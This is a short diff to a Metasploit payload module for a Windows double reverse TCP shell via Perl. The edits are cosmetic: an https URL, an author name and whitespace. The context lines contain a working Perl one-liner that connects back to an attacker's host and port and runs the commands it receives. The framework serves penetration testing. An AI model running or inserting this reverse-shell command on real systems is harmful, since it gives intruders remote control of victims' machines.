@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -18,7 +18,7 @@ module MetasploitModule
     super(merge_info(info,
       'Name'          => 'Windows Command, Double Reverse TCP Connection (via Perl)',
       'Description'   => 'Creates an interactive shell via perl',
-      'Author'        => ['cazz', 'patrick'],
+      'Author'        => ['cazz', 'aushack'],
       'License'       => BSD_LICENSE,
       'Platform'      => 'win',
       'Arch'          => ARCH_CMD,
@@ -50,5 +50,4 @@ module MetasploitModule
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
     cmd   = %{perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\\"#{lhost}:#{datastore['LPORT']}\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"}
   end
-
 end
